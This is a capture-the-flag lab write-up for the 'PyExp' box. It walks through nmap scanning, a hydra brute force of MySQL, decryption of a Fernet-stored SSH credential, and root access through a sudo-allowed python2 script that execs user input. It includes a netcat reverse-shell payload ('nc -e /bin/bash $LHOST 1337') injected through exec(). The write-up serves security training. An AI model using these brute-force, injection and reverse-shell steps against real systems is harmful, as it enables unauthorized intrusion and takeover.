----------------
# PyExp writeup
----------------
## Info-sheet
- IP-address: 192.168.65.118
- DNS-Domain name: N/A
- Host name: PyExp
- OS: Linux

## Overview
Exploit this box by bruteforcing credential of exposed **mysql**, inside the database contained encrypted credentials, after figured out the encryption type(**fernet** in this case), we decrypt it and got ssh credential. Then escalate to root through misconfigured sudo permission on **python2** binary and vulnerable python script.

------------------------
## Recon
------------------------
Services and ports:
```bash
# Nmap 7.91 scan initiated Tue Sep  7 06:25:15 2021 as: nmap -v -A -oN scans/nmap.txt -Pn 192.168.65.118  
Nmap scan report for 192.168.65.118  
Host is up (0.070s latency).  
Not shown: 999 closed ports  
PORT     STATE SERVICE VERSION  
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1  
| mysql-info:    
|   Protocol: 10  
|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1  
|   Thread ID: 39  
|   Capabilities flags: 63486  
|   Some Capabilities: ConnectWithDatabase, LongColumnFlag, Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsTran  
sactions, IgnoreSigpipes, Speaks41ProtocolNew, InteractiveClient, SupportsLoadDataLocal, ODBCClient, FoundRows, SupportsCompression, SupportsMultipleStatments, Supports  
MultipleResults, SupportsAuthPlugins  
|   Status: Autocommit  
|   Salt: Z8JKy@q9h"jt)ld2kDQK  
|_  Auth Plugin Name: mysql_native_password  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.91%E=4%D=9/7%OT=3306%CT=1%CU=33335%PV=Y%DS=2%DC=T%G=Y%TM=61373E  
OS:1B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=  
OS:M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7  
OS:%O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y  
OS:%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD  
OS:=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=  
OS:)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G  
OS:%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)  
  
Uptime guess: 46.861 days (since Thu Jul 22 09:45:15 2021)  
Network Distance: 2 hops  
TCP Sequence Prediction: Difficulty=259 (Good luck!)  
IP ID Sequence Generation: All zeros  
  
TRACEROUTE (using port 111/tcp)  
HOP RTT      ADDRESS  
1   84.96 ms 192.168.49.1  
2   85.94 ms 192.168.65.118  
  
Read data files from: /usr/bin/../share/nmap  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Tue Sep  7 06:25:31 2021 -- 1 IP address (1 host up) scanned in 16.68 seconds
```
- There only 1 port opened!!!, well this is unbelievable so let scan all the ports
```bash
# Nmap 7.91 scan initiated Tue Sep  7 06:26:00 2021 as: nmap -v -p- -oN scans/nmap_all.txt -Pn 192.168.65.118  
Nmap scan report for 192.168.65.118  
Host is up (0.069s latency).  
Not shown: 65533 closed ports  
PORT     STATE SERVICE  
1337/tcp open  waste  
3306/tcp open  mysql  
  
Read data files from: /usr/bin/../share/nmap  
# Nmap done at Tue Sep  7 06:28:31 2021 -- 1 IP address (1 host up) scanned in 151.33 seconds
```

```bash
sudo nmap -p 1337 192.168.65.118 -sV

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-19 13:27 EST
Nmap scan report for 192.168.65.118
Host is up (0.031s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- So there a hidden port: `1337` running `SSH`
- Seeing only these 2 ports, There no other way in except accessing the database, so we will bruteforce

-----------------
## Exploitation
-----------------
### Port 3306 - Mysql
#### Bruteforcing credentials
- We will use **hydra** with rockyou wordlists
- command: `hydra -l root -P <wordlists location> $IP mysql -f -V`
`-l` specify username to bruteforce against(root is default username in mysql)
`-P` specify path to wordlists
`-f` stop the process when found a valid paired of credential
`-V` verbose mode


- After some times(for me it 8 mins), hydra found valid pair of credential: `root:prettywoman`
#### Enumerate mysql database
- Login into mysql: `mysql -u root -pprettywoman -h $IP`
`-u` specify username
`-p` specify password(no space)
`-h` specify the target host you connecting to

- We're in
```bash
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 10063
Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

- Let read lists of databases: `SHOW DATABASES;`
```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.097 sec)
```
- Let read list tables inside `data`
- Select database: `USE data;`
- List tables: `SHOW TABLES;`
```sql
MariaDB [(none)]> USE data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [data]> SHOW TABLES;
+----------------+
| Tables_in_data |
+----------------+
| fernet         |
+----------------+
1 row in set (0.069 sec)
```
- Let check what inside `fernet` table: `SELECT * FROM fernet;`
```bash
MariaDB [data]> SELECT * FROM fernet;
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
1 row in set (0.056 sec)
```

- seeing `cred` and `key` columns, there possibility that this is somekind of symmetric encryption(decrypt/encrypt data using single key)
#### Decrypting the encrypted data
- We do some research and seem like there possibility that these 2 pair, key and encrypted data are using **fernet**(the table name is the hint) encryption
- according to this [site](https://cryptography.io/en/latest/fernet/): 
```text
Fernet guarantees that a message encrypted using it cannot be manipulated or read without the key. [Fernet] is an implementation of symmetric (also known as “secret key”) authenticated cryptography. Fernet also has support for implementing key rotation via [`MultiFernet`].
```
- Using [fernet decoder](https://asecuritysite.com/encryption/ferdecode)
- We be able to decrypt the data: ````lucy:wJ9`\"Lemdv9[FEw-````
- So we got plain text credential for user: `lucy`
#### Login to SSH using credential
- Now we just need to login: `ssh lucy@$IP -p 1337`
- We're logged in
```bash
lucy@pyexp:~$ id
uid=1000(lucy) gid=1000(lucy) groups=1000(lucy),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

-----------------------
## Privilege Escalation
-----------------------

### Sudo permission
- Run `sudo -l`, to list our sudo permission
```bash
lucy@pyexp:~$ sudo -l
Matching Defaults entries for lucy on pyexp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
```
- We can run `/opt/exp.py` as root user using sudo
### Vulnerable python script
- Read `/opt/exp.py` content
```python
uinput = raw_input('how are you?')
exec(uinput)
```
- According to this [article](https://www.stackhawk.com/blog/command-injection-python/#exploiting-eval-and-exec) about python code injection
We can injection this payload to execute system command inside `exec()` or `eval()`
`__import__(‘os’).system(<command here>)`
- This time instead of executing command to give SUID perm on `/bin/bash` binary, we will just give us reverse shell instead(so the writeups not get so repetitive)
- payload: `__import__(‘os’).system(‘
nc -e /bin/bash $LHOST 1337’)`
- set up listener, execute the payload, we got reverse shell back as root
```bash
~$ nc -lvp 1337
listening on [any] 1337 ...
192.168.65.118: inverse host lookup failed: Unknown host
connect to [192.168.49.188] from (UNKNOWN) [192.168.65.118] 37210
python -c 'import pty; pty.spawn("/bin/bash")'
root@pyexp:/home/lucy# whoami
whoami
root
```

##### rooted!

#### constraint
##### This is meaning of *variables* and *symbols* I use inside my writeups
- $LHOST = your local IP address
- $LPORT = your local port
- \$IP/$RHOST = target IP address
- $RPORT = target port
- $COMMAND = system command you want to run(for RCE, injection)

#### references
- https://www.stackhawk.com/blog/command-injection-python/#exploiting-eval-and-exec
- https://www.revshells.com/
- https://cryptography.io/en/latest/fernet/
- https://asecuritysite.com/encryption/ferdecode
